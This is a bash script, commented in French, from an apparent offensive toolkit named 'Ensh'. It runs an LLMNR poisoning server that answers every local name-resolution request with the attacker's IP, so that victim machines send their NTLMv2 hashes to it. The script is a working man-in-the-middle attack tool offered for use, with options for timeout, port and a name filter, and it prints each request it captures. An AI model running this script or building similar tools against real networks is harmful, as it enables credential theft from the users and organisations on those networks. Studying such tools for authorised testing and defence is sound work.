#!/usr/bin/env bash
#
# examples/llmnr_poison.sh — Poisoning LLMNR pour capturer des hashes NTLM
#
# Démarre un serveur LLMNR qui répond à toutes les requêtes de résolution de
# nom avec l'IP de l'attaquant. Les machines victimes tentent alors de
# s'authentifier (SMB, HTTP…) sur cette IP, exposant leurs hashes NTLMv2.
#
# Requiert socat pour l'écoute UDP multicast (224.0.0.252:5355).
# Droits root nécessaires pour écouter sur le port 5355.
#
# Usage :
#   sudo bash examples/llmnr_poison.sh [options] <iface> <attacker_ip>
#
# Options :
#   -t, --timeout <s>   Durée d'écoute en secondes (défaut : 60, 0 = infini)
#   -p, --port <port>   Port LLMNR (défaut : 5355)
#   -f, --filter <nom>  Ne répondre qu'aux requêtes pour ce nom (optionnel)
#
# Exemples :
#   sudo bash examples/llmnr_poison.sh eth0 192.168.1.10
#   sudo bash examples/llmnr_poison.sh -t 120 -f FILESERVER eth0 10.10.14.5
#
# Référence : RFC 4795, MITRE ATT&CK T1557.001
#
# ─────────────────────────────────────────────────────────────────────────────

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../ensh.sh"

ensh::import protocol/llmnr/server

# ── Parsing des arguments ─────────────────────────────────────────────────────

TIMEOUT=60
PORT=5355
FILTER=""

_args=()
while (( $# > 0 )); do
    case "$1" in
        -t|--timeout) TIMEOUT="$2"; shift 2 ;;
        -p|--port)    PORT="$2";    shift 2 ;;
        -f|--filter)  FILTER="$2";  shift 2 ;;
        *) _args+=("$1"); shift ;;
    esac
done

IFACE="${_args[0]:-}"
ATTACKER_IP="${_args[1]:-}"

if [[ -z "${IFACE}" || -z "${ATTACKER_IP}" ]]; then
    printf 'Usage : %s [options] <iface> <attacker_ip>\n' "$0" >&2
    printf '\nOptions :\n' >&2
    printf '  -t <sec>     Durée d'\''écoute (défaut : 60, 0 = infini)\n' >&2
    printf '  -p <port>    Port LLMNR (défaut : 5355)\n' >&2
    printf '  -f <nom>     Filtrer sur un nom spécifique\n' >&2
    exit 1
fi

# ── Helpers affichage ─────────────────────────────────────────────────────────

_banner() {
    printf '\n%s\n' "════════════════════════════════════════════════"
    printf  ' Ensh — LLMNR Poisoning\n'
    printf  '%s\n' "════════════════════════════════════════════════"
    printf  '  Interface  : %s\n'   "${IFACE}"
    printf  '  Attaquant  : %s\n'   "${ATTACKER_IP}"
    printf  '  Port       : %s\n'   "${PORT}"
    if [[ -n "${FILTER}" ]]; then
    printf  '  Filtre     : %s\n'   "${FILTER}"
    fi
    if (( TIMEOUT > 0 )); then
    printf  '  Durée      : %ss\n'  "${TIMEOUT}"
    else
    printf  '  Durée      : infinie (Ctrl-C pour arrêter)\n'
    fi
    printf  '\n'
}

_ok()   { printf ' \033[32m[+]\033[0m %s\n' "$*"; }
_err()  { printf ' \033[31m[✗]\033[0m %s\n' "$*" >&2; }
_info() { printf ' \033[34m[*]\033[0m %s\n' "$*"; }
_hit()  { printf ' \033[33m[!]\033[0m %s\n' "$*"; }

_banner

# ── Vérifications ─────────────────────────────────────────────────────────────

if ! command -v socat >/dev/null 2>&1; then
    _err "socat introuvable — requis pour l'écoute UDP multicast"
    exit 1
fi

if [[ $EUID -ne 0 ]]; then
    _err "Droits root nécessaires pour écouter sur le port ${PORT}"
    exit 1
fi

# ── Callback : affiché à chaque requête capturée ──────────────────────────────
# Note : le callback tourne dans un sous-process socat séparé.
# On utilise une commande shell simple (printf) car les fonctions bash du
# process principal ne sont pas disponibles dans les workers socat.

# Écrire le callback dans un script temporaire
_CB_SCRIPT="$(mktemp /tmp/.llmnr_cb_XXXXXX.sh)"
chmod 700 "${_CB_SCRIPT}"

if [[ -n "${FILTER}" ]]; then
    cat > "${_CB_SCRIPT}" << CB_EOF
#!/usr/bin/env bash
name="\$1"; src="\$2"
[[ "\${name,,}" == "${FILTER,,}" ]] || exit 0
printf ' \033[33m[!]\033[0m Requête de %s pour "%s" — réponse envoyée\n' "\${src}" "\${name}" >&2
CB_EOF
else
    cat > "${_CB_SCRIPT}" << CB_EOF
#!/usr/bin/env bash
name="\$1"; src="\$2"
printf ' \033[33m[!]\033[0m Requête de %s pour "%s" — réponse envoyée\n' "\${src}" "\${name}" >&2
CB_EOF
fi
chmod +x "${_CB_SCRIPT}"

_cleanup() {
    llmnr::server::stop
    rm -f "${_CB_SCRIPT}"
}
trap '_cleanup' EXIT INT TERM

# ── Démarrage du serveur ──────────────────────────────────────────────────────

export ENSH_LLMNR_PORT="${PORT}"

_info "Démarrage du serveur LLMNR sur ${IFACE}:${PORT}..."
if ! llmnr::server::start "${IFACE}" "${ATTACKER_IP}" "bash ${_CB_SCRIPT}"; then
    _err "Impossible de démarrer le serveur LLMNR"
    exit 1
fi
_ok "Serveur actif — en attente de requêtes LLMNR..."
printf '\n'
printf ' %-16s  %s\n' "SOURCE" "NOM DEMANDÉ"
printf ' %s\n' "──────────────────────────────────────────────────"

# ── Attente ───────────────────────────────────────────────────────────────────

if (( TIMEOUT > 0 )); then
    sleep "${TIMEOUT}"
else
    # Attente infinie jusqu'à Ctrl-C
    while kill -0 "${_LLMNR_SERVER_PID:-0}" 2>/dev/null; do
        sleep 1
    done
fi

printf '\n'
_info "Arrêt du serveur LLMNR."
